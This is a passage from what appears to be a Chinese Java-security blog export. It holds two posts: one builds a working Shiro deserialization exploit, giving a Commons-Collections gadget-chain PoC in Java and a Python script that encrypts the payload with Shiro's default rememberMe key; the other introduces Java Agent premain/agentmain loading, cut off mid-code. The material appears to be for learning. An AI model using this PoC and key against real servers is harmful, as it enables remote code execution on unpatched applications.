comment">//在readObject中赋值了new TransformerFactoryImpl()</span>tfactoryfield<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>InvokeTransformer可以直接调用newTransformer方法进行类加载<br>入口类</p><ul><li>HashMap.readObject()会触发hashCode方法</li><li>TiedMapEntry中的HashCode调用了getValue(),getVaule中调了get</li><li>LazyMap 这个类的 get 方法中出现了 .transform 方法</li></ul><p>因此只需要将TiedMapEntry放入LazyMap ，再把TiedMapEntry放入hashmap<br>就会触发LazyMap中的key的get,</p><h4 id="最终poc"><a href="#最终poc" class="headerlink" title="最终poc"></a>最终poc</h4><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">TransformedMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">TransformerConfigurationException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> c11 <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">TransformerConfigurationException</span> <span class="token punctuation">{</span>        <span class="token comment">//cc3</span>        <span class="token class-name">TemplatesImpl</span> templates<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> tc<span class="token operator">=</span>templates<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> namefield <span class="token operator">=</span> tc<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        namefield<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        namefield<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> bytecodefield <span class="token operator">=</span> tc<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_bytecodes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bytecodefield<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//赋给我们的字节码,二维数组，代码会循环遍历</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code<span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"D:\\coderesp\\java\\learn\\exp\\target\\classes\\org\\example\\test.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span>  codes<span class="token operator">=</span><span class="token punctuation">{</span>code<span class="token punctuation">}</span><span class="token punctuation">;</span>        bytecodefield<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span>codes<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> tfactoryfield <span class="token operator">=</span> tc<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_tfactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tfactoryfield<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//在readObject中赋值了new TransformerFactoryImpl()</span>        tfactoryfield<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//CC2</span>        <span class="token class-name">InvokerTransformer</span> invokerTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"newTransformer"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//CC6</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value"</span><span class="token punctuation">,</span><span class="token string">"hu"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> decoratemap<span class="token operator">=</span><span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TiedMapEntry</span> tiedMapEntry<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>decoratemap<span class="token punctuation">,</span>templates<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//tidemapentry-&gt;内嵌LazyMap-&gt;内嵌HashMap,再放入hashmap</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> map2<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map2<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span><span class="token string">"sss"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        decoratemap<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>templates<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> c<span class="token operator">=</span>decoratemap<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> factory<span class="token operator">=</span>c<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"factory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        factory<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        factory<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>decoratemap<span class="token punctuation">,</span>invokerTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        utils<span class="token punctuation">.</span>tools<span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span>map2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="AES-base64加密脚本"><a href="#AES-base64加密脚本" class="headerlink" title="AES+base64加密脚本"></a>AES+base64加密脚本</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">import</span> uuid<span class="token keyword">import</span> base64<span class="token keyword">def</span> <span class="token function">convert_bin</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">return</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">AES_enc</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    BS<span class="token operator">=</span>AES<span class="token punctuation">.</span>block_size    pad<span class="token operator">=</span><span class="token keyword">lambda</span> s<span class="token punctuation">:</span>s<span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">(</span>BS<span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">%</span>BS<span class="token punctuation">)</span><span class="token operator">*</span><span class="token builtin">chr</span><span class="token punctuation">(</span>BS<span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">%</span>BS<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>    key<span class="token operator">=</span><span class="token string">"kPH+bIxk5D2deZiIxcaaaA=="</span>    mode<span class="token operator">=</span>AES<span class="token punctuation">.</span>MODE_CBC    iv<span class="token operator">=</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">bytes</span>    encryptor<span class="token operator">=</span>AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span>mode<span class="token punctuation">,</span>iv<span class="token punctuation">)</span>    ciphertext<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>iv<span class="token operator">+</span>encryptor<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>pad<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ciphertext<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    data<span class="token operator">=</span>convert_bin<span class="token punctuation">(</span><span class="token string">"ser.bin"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>AES_enc<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> java反序列化漏洞 </tag>
            
            <tag> shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java Agent</title>
      <link href="/2024/05/04/java-Agent/"/>
      <url>/2024/05/04/java-Agent/</url>
      
        <content type="html"><![CDATA[<h1 id="java-Agent"><a href="#java-Agent" class="headerlink" title="java Agent"></a>java Agent</h1><p>JDK1.5开始，Java新增了Instrumentation(Java Agent API)和JVMTI(JVM Tool Interface)功能，允许JVM在加载某个class文件之前对其字节码进行修改，同时也支持对已加载的class(类字节码)进行重新加载(Retransform)。<br>利用Java Agent这一特性衍生出了APM(Application Performance Management，应用性能管理)、RASP(Runtime application self-protection，运行时应用自我保护)、IAST(Interactive Application Security Testing，交互式应用程序安全测试)等相关产品，它们都无一例外的使用了Instrumentation/JVMTI的API来实现动态修改Java类字节码并插入监控或检测代码。</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Java Agent 本质上可以理解为一个插件，该插件就是一个精心提供的 Jar 包。只是启动方式和普通 Jar 包有所不同，对于普通的 Jar 包，通过指定类的 main 函数进行启动。但是 Java Agent 并不能单独启动，必须依附在一个 Java 应用程序运行，在面向切面编程方面应用比较广泛</p><p>Java Agent 的 Jar 包通过 JVMTI（JVM Tool Interface）完成加载，最终借助 JPLISAgent（Java Programming Language Instrumentation Services Agent）完成对目标代码的修改。主要功能如下：</p><p>可以在加载 Java 文件之前做拦截把字节码做修改<br>可以在运行期将已经加载的类的字节码做变更<br>在 JDK1.5 版本开始，Java 增加了 Instrumentation（Java Agent API）和 JVMTI（JVM Tool Interface）功能，该功能可以实现 JVM 在加载某个 class 文件对其字节码进行修改，也可以对已经加载的字节码进行一个重新的加载。而在 1.6 版本新增了 Attach（附加）方式，可以对运行中的 Java 进程插入 Agent。Java Agent 可以去实现字节码插桩、动态跟踪分析等，比如 RASP 产品和 Java Agent 内存马</p><p>对于 Agent（代理）来讲，其大致可以分为两种，一种是在 JVM 启动前加载的premain-Agent，另一种是 JVM 启动之后加载的 agentmain-Agent。这里我们可以将其理解成一种特殊的 Interceptor（拦截器），如下图<br><strong>Premain-Agent</strong><br><img src="/img/5-4/1.png"><br><strong>agentmain-Agent</strong><br><img src="/img/5-4/2.png"><br>Java agent的使用方式有两种：</p><ul><li>实现premain方法，在JVM启动前加载。</li><li>实现agentmain方法，在JVM启动后加载。</li></ul><p>premain和agentmain函数声明如下，拥有Instrumentation inst参数的方法<strong>优先级更高</strong>：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">agentmain</span><span class="token punctuation">(</span><span class="token class-name">String</span> agentArgs<span class="token punctuation">,</span> <span class="token class-name">Instrumentation</span> inst<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">agentmain</span><span class="token punctuation">(</span><span class="token class-name">String</span> agentArgs<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">premain</span><span class="token punctuation">(</span><span class="token class-name">String</span> agentArgs<span class="token punctuation">,</span> <span class="token class-name">Instrumentation</span> inst<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">premain</span><span class="token punctuation">(</span><span class="token class-name">String</span> agentArgs<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span></code></pre><p>第一个参数String agentArgs就是Java agent的参数。</p><p>ava Agent还限制了我们必须以jar包的形式运行或加载，我们必须将编写好的Agent程序打包成一个jar文件。除此之外，Java Agent还强制要求了所有的jar文件中必须包含/META-INF/MANIFEST.MF文件，且该文件中必须定义好Premain-Class（Agent模式）或Agent-Class:（Agent模式）配置</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="premain"><a href="#premain" class="headerlink" title="premain"></a>premain</h3><p><strong>构建</strong><br>编写agent项目</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjccc</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>instrument<span class="token punctuation">.</span></span><span class="token class-name">Instrumentation</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PerMain</span> <span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">premain</span><span class="token punctuation">(</span><span class="token class-name">String</span> args<span class="token punctuation">,</span> <span class="token class-name">Instrumentation</span> instrumentation<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span><span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Runnable</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"my Agent --"</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">{</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token operator">*</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>打包成jar<br>使用idea打包<br><img src="/img/5-4/3.png"><br>agent不要选取主类，选择通过清单链接<br>在src/main/resources/目录下修改META-INF/MANIFEST.MF，需要指定Premain-Class，注意最后的换行</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Manifest</span><span class="token operator">-</span><span class="token class-name">Version</span><span class="token operator">:</span> <span class="token number">1.0</span><span class="token class-name">Premain</span><span class="token operator">-</span><span class="token class-name">Class</span><span class="token operator">:</span> <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span></span>PerMain</span></code></pre><p>然后idea输出构建工件<br><img src="/img/5-4/4.png"><br>最后得到需要附加的Agnet jar包<br><img src="/img/5-4/5.png"></p><p><strong>使用</strong><br>测试主程序</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjccc</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>配置启动设置<br>添加虚拟机选项VM option<br>设置-javaagent  值为刚才的jar包路径</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token operator">-</span>javaagent<span class="token operator">:</span><span class="token class-name">F</span><span class="token operator">:</span>\code\java\myAgent\myAgent\target\artifacts\myAgent_jar\myAgent<span class="token punctuation">.</span>jar</code></pre><p>运行程序<br><img src="/img/5-4/6.png"><br>附加的包的premain方法会在Main函数之前执行（这里是多开了一个线程）<br>还有直接使用命令</p><pre class="language-java" data-language="java"><code class="language-java">java  <span class="token operator">-</span>javaagent<span class="token operator">:</span><span class="token class-name">F</span><span class="token operator">:</span>\code\java\myAgent\myAgent\target\artifacts\myAgent_jar\myAgent<span class="token punctuation">.</span>jar <span class="token operator">-</span>jar <span class="token punctuation">.</span>\common<span class="token punctuation">.</span>jar</code></pre><p><strong>缺陷</strong><br>这种方法存在一定的局限性——<strong>只能在启动时使用-javaagent参数指定</strong>。在实际环境中，目标的JVM通常都是已经启动的状态，无法预先加载premain。相比之下，agentmain更加实用。</p><h3 id="agentmain"><a href="#agentmain" class="headerlink" title="agentmain"></a>agentmain</h3><p>写一个agentmain和premain差不多，只需要在META-INF/MANIFEST.MF中加入Agent-Class:即可，且编写的是agentmain方法</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Manifest</span><span class="token operator">-</span><span class="token class-name">Version</span><span class="token operator">:</span> <span class="token number">1.0</span><span class="token class-name">Premain</span><span class="token operator">-</span><span class="token class-name">Class</span><span class="token operator">:</span> <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span></span>PerMain</span><span class="token class-name">Agent</span><span class="token operator">-</span><span class="token class-name">Class</span><span class="token operator">:</span> <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>yyjccc<span class="token punctuation">.</span></span>AgentMain</span></code></pre><p>附加Agent的代码</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>yyjccc</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>instrument<span class="token punctuation">.</span></span><span class="token class-name">Instrumentation</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AttachAgent</span> <span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">agentmain</span><span class="token punctuation">(</span><span class="token class-name">String</span> args<span class="token punctuation">,</span> <span class="token class-name">Instrumentation</span> instrumentation<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Attach Agent --"</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>同样的要将Agent程序打包成jar </p><p>不同的是，这种方法不是通过JVM启动前的参数来指定的，官方为了实现启动后加载，提供了Attach API。Attach API 很简单，只有 2 个主要的类，都在 com.sun.tools.attach 包里面。着重关注的是VitualMachine这个类。</p><h4 id="VirtualMachine"><a href="#VirtualMachine" class="headerlink" title="VirtualMachine"></a>VirtualMachine</h4><p>JDK 默认有tools.jar，JRE 默认没有。并且 Linux 和 Windows 之间是存在一个适配问题<br>字面意义表示一个Java 虚拟机，也就是程序需要监控的目标虚拟机，提供了获取系统信息、 loadAgent，Attach 和 Detach 等方法，可以实现的功能可以说非常之强大 。该类允许我们通过给attach方法传入一个jvm的pid(进程id)，远程连接到jvm上 。代理类注入操作只是它众多功能中的一个，通过loadAgent方法向jvm注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例<br>（注意jdk8 , 依赖是tool.jar）在jdk安装目录中的lib目录下，idea中手动加一下<br><img src="/img/5-4/7.png"></p><p>下面列几个这个类提供的方法：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">VirtualMachine</span> <span class="token punctuation">{</span>    <span class="token comment">// 获得当前所有的JVM列表</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">VirtualMachineDescriptor</span><span class="token punctuation">&gt;</span></span> <span class="token function">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token 